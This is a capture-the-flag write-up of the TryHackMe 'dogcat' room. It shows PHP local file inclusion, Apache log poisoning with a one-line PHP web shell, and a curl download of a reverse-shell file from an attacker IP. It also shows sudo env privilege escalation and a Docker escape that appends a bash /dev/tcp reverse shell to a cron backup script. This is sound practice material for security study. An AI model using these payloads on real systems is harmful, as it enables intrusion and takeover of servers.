---
title : "TryHackMe: Dogcat WriteUp"
author : Seif-Allah
description : "TryHackMe: WriteUp for the 'dogcat' room (Level: Medium)"
layout : post
category: CTF-WriteUp
tags : [THM,TryHackMe,WriteUp,dogcat,Medium,CTF]
image : /assets/images/writeups/thm/anonymous/dogcat.png
---
Link : [dogcat room](https://tryhackme.com/room/dogcat)

Welcome, Welcome, Welcome and welcome ! 

### Introduction 
After finishing [lfi basics room](), and learning some new lfi stuff, I chose this room to practice my new skill, and I absolutely recommend it! 

### Enumeration

- - -
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
```
Nothing fancy here, there's a web server running on port 80, let's check it! 

![homepage](/assets/thm/dogcat/homepage.png)

Basically, it's a web app that choose randomly a cat or a dog image based on user choice (images are stored inside a dog and cat folders - look at the source). 

The user choice (cat | dog) are passed to the server through the *view* variable (look at the url), so what if we enter something other than dog or cat ? for example *ls*
- - -
```html
Sorry, only dogs or cats are allowed.
```
- - -
So only dogs or cats allowed ? lets try *dog;ls* ?
- - -
```html 
Warning: include(dog;ls.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dog;ls.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```
humm ! so there's an include function running inside the */var/www/html/index.php* file that failed to open *days;ls.php* file. 

I think it's time for some [lfi](https://github.com/seifallahhomrani1/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi) now ! 

First things first, I used the null byte character : %00
The result was : 
- - -
```
Warning: include(): Failed opening 'dog;ls' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```
so we get rid of the first warning which means that :
- the program concatenate .php extension at the end of the input unless it's dog or cat.

Ok, let's *directory traversal* : 
- - -
```html
“/?view=php://filter/read=convert.base64-encode/resource=./dog/../index”
Result after decoding : 

<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
         <!-- the site checks if ext variable is set, if not it assigns it .php   -->
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
html comment is my explanation of the code.


### LFI to RCE via controlled log file 
Like mentioned [here](https://github.com/seifallahhomrani1/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi), I did a request to the server (in our case Apache) and include the log file (/var/log/apache2/access.log&ext). Reading the log file, it looks like we can insert a php script inside the user agent header since it's not manipulated(10.4.14.245 - - [14/Nov/2020:17:13:34 +0000] "GET / HTTP/1.1" 200 537 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" 10.4.14.245 -), so I inserted this code : 
- - -
```php
<?php system($_GET['cmd']);?>
```
- - -
and then started a web server on my local host to host a reverse shell file and used wget command to save it inside a temporary file to finally get a reverse shell ! 
- - -
```
/?view=./dog/../../../../../../../var/log/apache2/access.log&ext&cmd=curl http://MY-IP:80/reverse.php > /tmp/reverse.php
```
- - -
After that, I used chmod to make it executable and started a listener in my local host and running the file from the browser
BOOM!! I got the reverse shell ! 
- - -
```bash
root@kali:~/Documents/thm/startup# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.4.14.245] from (UNKNOWN) [10.10.129.131] 46518
Linux 571f0aa7aca9 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 18:05:41 up 55 min,  0 users,  load average: 0.23, 0.11, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
Spawning a tty shell using */bin/bash -i* command, and looking at the user directory we can find the 2nd flag. 
The first flag was inside the */var/www/html/* directory. (We could retrieve it by running view=flag in the url, anyway)
Now we need to escalate our privileges.
### PrivEsc
Running sudo -l command, it looks like we can *env* as root, checking [gtfobins] as always and yeah we can escalate our privileges to root by running :
*sudo env /bin/sh*, easy!
We can now retrieve the 3rd flag from root directory. 

But now !! THE FUN BEGIN 

### Breaking DOCKER LOCKER 
The 4th flag was really hard to get for me, I didn't face any of these kinda flags before but it was kinda fun to get it ! 

By looking at this [article](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1) from the famous Vickie Lie, and the docker tag from the room cover, I check /proc/1/cgroup file to check if we are inside a docker container or not. 

So I manually enumerated the machine, looking for elements that could help me escape the container such as a script via the find / -type f -name *.sh command because nothing of the tricks found helped me, the first result is the file /opt/backups/backup.sh, hum interesting, looking at its contents : 
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```
From what it looks like, basically it's a cronjob that backup the container, and since it's writeable, let's add a reverse shell, start a listener and wait for it to be executed.
- - -
```
echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1'" >> backup.sh
```
- - -
After few minutes we get a reverse shell from the parent host and we can easily get flag4.txt ! 

### Final thoughts 
This room rocks ! I absolutely recommend for all beginners like me ! 
Huge thanks to [jammy](https://tryhackme.com/p/jammy) ! 
